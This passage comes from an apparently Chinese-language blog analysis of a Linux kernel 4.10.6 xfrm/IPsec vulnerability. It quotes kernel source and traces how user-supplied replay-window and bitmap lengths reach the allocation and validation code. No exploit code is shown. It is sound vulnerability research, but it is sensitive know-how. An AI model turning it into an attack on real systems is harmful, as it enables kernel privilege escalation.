class="comment">/* internal flag that only holds state for delayed aevent at the</span></span><br><span class="line"><span class="comment">	 * moment</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	u32			xflags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replay detection notification settings */</span></span><br><span class="line">	u32			replay_maxage;</span><br><span class="line">	u32			replay_maxdiff;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replay detection notification timer */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span>	<span class="title">rtimer</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Statistics */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_stats</span>	<span class="title">stats</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_lifetime_cur</span> <span class="title">curlft</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_hrtimer</span>	<span class="title">mtimer</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* used to fix curlft-&gt;add_time when changing date */</span></span><br><span class="line">	<span class="keyword">long</span>		saved_tmo;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Last used time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		lastused;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Reference to data common to all the instances of this</span></span><br><span class="line"><span class="comment">	 * transformer. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xfrm_type</span>	*<span class="title">type</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_mode</span>	*<span class="title">inner_mode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_mode</span>	*<span class="title">inner_mode_iaf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_mode</span>	*<span class="title">outer_mode</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Security context */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_sec_ctx</span>	*<span class="title">security</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Private data of this transformer, format is opaque,</span></span><br><span class="line"><span class="comment">	 * interpreted by xfrm_type methods. */</span></span><br><span class="line">	<span class="keyword">void</span>			*data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，<code>struct xfrm_id id;</code>用于标识一个<code>SA</code>身份，包含<code>daddr、spi、proto</code>三个参数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xfrm_id</span> &#123;</span></span><br><span class="line">	<span class="keyword">xfrm_address_t</span>	daddr;</span><br><span class="line">	__be32		spi;</span><br><span class="line">	__u8		proto;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>此外，<code>SA</code>还包括一个<code>xfrm_replay_state_esn</code>结构体，该结构体定义如下。其中bmp是一个边长的内存区域，是一块<code>bitmap</code>，用于标识数据包的<code>seq</code>是否被重放过，其中<code>bmp_len</code>表示变长结构体的大小，replay_window用于<code>seq</code>索引的模数，即索引的范围，此结构体在创建<code>xfrm_state</code>结构体时根据用户输入参数动态被创建，而程序漏洞存在于这个结构体的读写过程中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	bmp_len;</span><br><span class="line">	__u32		oseq;</span><br><span class="line">	__u32		seq;</span><br><span class="line">	__u32		oseq_hi;</span><br><span class="line">	__u32		seq_hi;</span><br><span class="line">	__u32		replay_window;</span><br><span class="line">	__u32		bmp[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="xfrm-state结构体生成"><a href="#xfrm-state结构体生成" class="headerlink" title="xfrm_state结构体生成"></a>xfrm_state结构体生成</h2><p>该结构体生成位于<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L616" target="_blank" rel="noopener">xfrm_add_sa</a>函数中，在[1]处对用户输入数据进行参数及协议检查，在[2]处对根据用户输入对结构体进行构造，并放入SA结构体的哈希链表中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">static int xfrm_add_sa(struct sk_buff *skb, struct nlmsghdr *nlh,</span><br><span class="line">		struct nlattr **attrs)</span><br><span class="line">&#123;</span><br><span class="line">	struct net *net = sock_net(skb-&gt;sk);</span><br><span class="line">	struct xfrm_usersa_info *p = nlmsg_data(nlh);</span><br><span class="line">	struct xfrm_state *x;</span><br><span class="line">	int err;</span><br><span class="line">	struct km_event c;</span><br><span class="line"></span><br><span class="line">[1]	err = verify_newsa_info(p, attrs); //协议及参数检查</span><br><span class="line">	if (err)</span><br><span class="line">		return err;</span><br><span class="line"></span><br><span class="line">[2]	x = xfrm_state_construct(net, p, attrs, &amp;err);</span><br><span class="line">	if (!x)</span><br><span class="line">		return err;</span><br><span class="line"></span><br><span class="line">	xfrm_state_hold(x);</span><br><span class="line">	if (nlh-&gt;nlmsg_type == XFRM_MSG_NEWSA)</span><br><span class="line">		err = xfrm_state_add(x);</span><br><span class="line">	else</span><br><span class="line">		err = xfrm_state_update(x);</span><br><span class="line"></span><br><span class="line">	xfrm_audit_state_add(x, err ? 0 : 1, true);</span><br><span class="line"></span><br><span class="line">	if (err &lt; 0) &#123;</span><br><span class="line">		x-&gt;km.state = XFRM_STATE_DEAD;</span><br><span class="line">		__xfrm_state_put(x);</span><br><span class="line">		goto out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.seq = nlh-&gt;nlmsg_seq;</span><br><span class="line">	c.portid = nlh-&gt;nlmsg_pid;</span><br><span class="line">	c.event = nlh-&gt;nlmsg_type;</span><br><span class="line"></span><br><span class="line">	km_state_notify(x, &amp;c);</span><br><span class="line">out:</span><br><span class="line">	xfrm_state_put(x);</span><br><span class="line">	return err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L151" target="_blank" rel="noopener">verify_newsa_info</a>函数中，首先根据<code>id.proto</code>协议对用户输入的非兼容性参数进行检查，并对各输入参数中的长度合理性进行检查，我们只关心在[1]处的<code>XFRMA_REPLAY_ESN_VAL</code>数据检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">verify_newsa_info</span><span class="params">(struct xfrm_usersa_info *p,</span></span></span><br><span class="line"><span class="function"><span class="params">			     struct nlattr **attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = -EINVAL;</span><br><span class="line">	<span class="keyword">switch</span> (p-&gt;family) &#123;</span><br><span class="line">	<span class="keyword">case</span> AF_INET: <span class="comment">//IPv4</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> AF_INET6: <span class="comment">//IPv6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_IPV6)</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		err = -EAFNOSUPPORT;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = -EINVAL;</span><br><span class="line">	<span class="keyword">switch</span> (p-&gt;id.proto) &#123;</span><br><span class="line">	<span class="keyword">case</span> IPPROTO_AH:</span><br><span class="line">......</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> IPPROTO_ESP:</span><br><span class="line">......</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> IPPROTO_COMP:</span><br><span class="line">......</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_IPV6)</span></span><br><span class="line">	<span class="keyword">case</span> IPPROTO_DSTOPTS:</span><br><span class="line">	<span class="keyword">case</span> IPPROTO_ROUTING:</span><br><span class="line">......</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((err = verify_aead(attrs))) <span class="comment">//XFRMA_ALG_AEAD参数长度检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> ((err = verify_auth_trunc(attrs)))<span class="comment">//XFRMA_ALG_AUTH_TRUNC参数长度检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> ((err = verify_one_alg(attrs, XFRMA_ALG_AUTH)))<span class="comment">//XFRMA_ALG_AUTH参数长度检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> ((err = verify_one_alg(attrs, XFRMA_ALG_CRYPT)))<span class="comment">//XFRMA_ALG_CRYPT参数长度检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> ((err = verify_one_alg(attrs, XFRMA_ALG_COMP)))<span class="comment">//XFRMA_ALG_COMP参数长度检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> ((err = verify_sec_ctx_len(attrs)))<span class="comment">//XFRMA_SEC_CTX数据长度定义检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">[<span class="number">1</span>]	<span class="keyword">if</span> ((err = verify_replay(p, attrs)))<span class="comment">//XFRMA_REPLAY_ESN_VAL数据检查</span></span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	err = -EINVAL;</span><br><span class="line">	<span class="keyword">switch</span> (p-&gt;mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> XFRM_MODE_TRANSPORT:</span><br><span class="line">	<span class="keyword">case</span> XFRM_MODE_TUNNEL:</span><br><span class="line">	<span class="keyword">case</span> XFRM_MODE_ROUTEOPTIMIZATION:</span><br><span class="line">	<span class="keyword">case</span> XFRM_MODE_BEET:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L103" target="_blank" rel="noopener">verify_replay</a>函数中，可以看到检查主要有如下几条：[1]<code>bmp_len</code>是否超过最大值，最大值定义为<code>4096/4/8</code>。[2]检查参数长度定义是否正确。[3]是否为<code>IPPROTO_ESP</code>或者<code>IPPROTO_AH</code>协议。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">verify_replay</span><span class="params">(struct xfrm_usersa_info *p,</span></span></span><br><span class="line"><span class="function"><span class="params">				struct nlattr **attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">rt</span> = <span class="title">attrs</span>[<span class="title">XFRMA_REPLAY_ESN_VAL</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> *<span class="title">rs</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; XFRM_STATE_ESN) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!rt)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		rs = nla_data(rt);</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]		<span class="keyword">if</span> (rs-&gt;bmp_len &gt; XFRMA_REPLAY_ESN_MAX / <span class="keyword">sizeof</span>(rs-&gt;bmp[<span class="number">0</span>]) / <span class="number">8</span>)<span class="comment">// (4096/4/8)</span></span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]		<span class="keyword">if</span> (nla_len(rt) &lt; xfrm_replay_state_esn_len(rs) &amp;&amp;</span><br><span class="line">		    nla_len(rt) != <span class="keyword">sizeof</span>(*rs)) <span class="comment">//bmp[0]=NULL 或 bmp+head &lt; nla_len</span></span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!rt)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* As only ESP and AH support ESN feature. */</span></span><br><span class="line">[<span class="number">3</span>]	<span class="keyword">if</span> ((p-&gt;id.proto != IPPROTO_ESP) &amp;&amp; (p-&gt;id.proto != IPPROTO_AH))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;replay_window != <span class="number">0</span>) </span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回到<code>xfrm_add_sa</code>函数，继续分析<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L528" target="_blank" rel="noopener">xfrm_state_construct</a>函数。首先在<code>xfrm_state_alloc</code>中用调用<code>kzalloc</code>函数新建<code>xfrm_state</code>，并拷贝用户数据进行赋值。接下来根据用户输入的各种参数进行类型构建。关于<code>xfrm_replay_state_esn</code>这个结构体在[3]处申请，在[4]处进行验证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct xfrm_state *<span class="title">xfrm_state_construct</span><span class="params">(struct net *net,</span></span></span><br><span class="line"><span class="function"><span class="params">					       struct xfrm_usersa_info *p,</span></span></span><br><span class="line"><span class="function"><span class="params">					       struct nlattr **attrs,</span></span></span><br><span class="line"><span class="function"><span class="params">					       <span class="keyword">int</span> *errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">[<span class="number">1</span>]	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_state</span> *<span class="title">x</span> = <span class="title">xfrm_state_alloc</span>(<span class="title">net</span>);</span> <span class="comment">//新建 xfrm_state 结构</span></span><br><span class="line">	<span class="keyword">int</span> err = -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!x)</span><br><span class="line">		<span class="keyword">goto</span> error_no_put;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]	copy_from_user_state(x, p);  <span class="comment">//拷贝用户数据</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attrs[XFRMA_SA_EXTRA_FLAGS])</span><br><span class="line">		x-&gt;props.extra_flags = nla_get_u32(attrs[XFRMA_SA_EXTRA_FLAGS]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((err = attach_aead(x, attrs[XFRMA_ALG_AEAD])))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> ((err = attach_auth_trunc(&amp;x-&gt;aalg, &amp;x-&gt;props.aalgo,</span><br><span class="line">				     attrs[XFRMA_ALG_AUTH_TRUNC])))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> (!x-&gt;props.aalgo) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((err = attach_auth(&amp;x-&gt;aalg, &amp;x-&gt;props.aalgo,</span><br><span class="line">				       attrs[XFRMA_ALG_AUTH])))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((err = attach_crypt(x, attrs[XFRMA_ALG_CRYPT])))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> ((err = attach_one_algo(&amp;x-&gt;calg, &amp;x-&gt;props.calgo,</span><br><span class="line">				   xfrm_calg_get_byname,</span><br><span class="line">				   attrs[XFRMA_ALG_COMP])))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attrs[XFRMA_ENCAP]) &#123;</span><br><span class="line">		x-&gt;encap = kmemdup(nla_data(attrs[XFRMA_ENCAP]),</span><br><span class="line">				   <span class="keyword">sizeof</span>(*x-&gt;encap), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (x-&gt;encap == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attrs[XFRMA_TFCPAD])</span><br><span class="line">		x-&gt;tfcpad = nla_get_u32(attrs[XFRMA_TFCPAD]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attrs[XFRMA_COADDR]) &#123;</span><br><span class="line">		x-&gt;coaddr = kmemdup(nla_data(attrs[XFRMA_COADDR]),</span><br><span class="line">				    <span class="keyword">sizeof</span>(*x-&gt;coaddr), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (x-&gt;coaddr == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	xfrm_mark_get(attrs, &amp;x-&gt;mark);</span><br><span class="line"></span><br><span class="line">	err = __xfrm_init_state(x, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attrs[XFRMA_SEC_CTX]) &#123;</span><br><span class="line">		err = security_xfrm_state_alloc(x,</span><br><span class="line">						nla_data(attrs[XFRMA_SEC_CTX]));</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//对x-&gt;replay_esn、x-&gt;preplay_esn初始化为用户输入XFRMA_REPLAY_ESN_VAL参数</span></span><br><span class="line">[<span class="number">3</span>]	<span class="keyword">if</span> ((err = xfrm_alloc_replay_state_esn(&amp;x-&gt;replay_esn, &amp;x-&gt;preplay_esn,</span><br><span class="line">					       attrs[XFRMA_REPLAY_ESN_VAL])))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	x-&gt;km.seq = p-&gt;seq;</span><br><span class="line">	x-&gt;replay_maxdiff = net-&gt;xfrm.sysctl_aevent_rseqth;</span><br><span class="line">	<span class="comment">/* sysctl_xfrm_aevent_etime is in 100ms units */</span></span><br><span class="line">	x-&gt;replay_maxage = (net-&gt;xfrm.sysctl_aevent_etime*HZ)/XFRM_AE_ETH_M;</span><br><span class="line"></span><br><span class="line">[<span class="number">4</span>]	<span class="keyword">if</span> ((err = xfrm_init_replay(x)))<span class="comment">//检查滑动窗口大小及flag，确定检测使用的函数</span></span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* override default values from above */</span></span><br><span class="line">	xfrm_update_ae_params(x, attrs, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	x-&gt;km.state = XFRM_STATE_DEAD;</span><br><span class="line">	xfrm_state_put(x);</span><br><span class="line">error_no_put:</span><br><span class="line">	*errp = err;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L421" target="_blank" rel="noopener">xfrm_alloc_replay_state_esn</a>中，可以看到通过<code>kzalloc</code>函数分别申请了两块同样大小的内存，大小为<code>sizeof(*replay_esn) + replay_esn-&gt;bmp_len * sizeof(__u32)</code>，并将用户数据中<code>attr[XFRMA_REPLAY_ESN_VAL]</code>内容复制过去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static int xfrm_alloc_replay_state_esn(struct xfrm_replay_state_esn **replay_esn,</span><br><span class="line">				       struct xfrm_replay_state_esn **preplay_esn,</span><br><span class="line">				       struct nlattr *rta)</span><br><span class="line">&#123;</span><br><span class="line">	struct xfrm_replay_state_esn *p, *pp, *up;</span><br><span class="line">	int klen, ulen;</span><br><span class="line"></span><br><span class="line">	if (!rta)</span><br><span class="line">		return 0;</span><br><span class="line"></span><br><span class="line">	up = nla_data(rta);</span><br><span class="line">	klen = xfrm_replay_state_esn_len(up);</span><br><span class="line">	ulen = nla_len(rta) &gt;= klen ? klen : sizeof(*up);</span><br><span class="line"></span><br><span class="line">	p = kzalloc(klen, GFP_KERNEL);</span><br><span class="line">	if (!p)</span><br><span class="line">		return -ENOMEM;</span><br><span class="line"></span><br><span class="line">	pp = kzalloc(klen, GFP_KERNEL);</span><br><span class="line">	if (!pp) &#123;</span><br><span class="line">		kfree(p);</span><br><span class="line">		return -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	memcpy(p, up, ulen);</span><br><span class="line">	memcpy(pp, up, ulen);</span><br><span class="line"></span><br><span class="line">	*replay_esn = p;</span><br><span class="line">	*preplay_esn = pp;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L585" target="_blank" rel="noopener">xfrm_init_replay</a>函数中对上述申请的结构体数据进行检查，<code>replay_window</code>不大于定义的<code>bmp_len</code>大小，并对<code>x-&gt;repl</code>进行初始化，该成员是一个函数虚表，作用是在收到<code>AH</code>或<code>ESP</code>协议数据包时进行数据重放检查。</p>
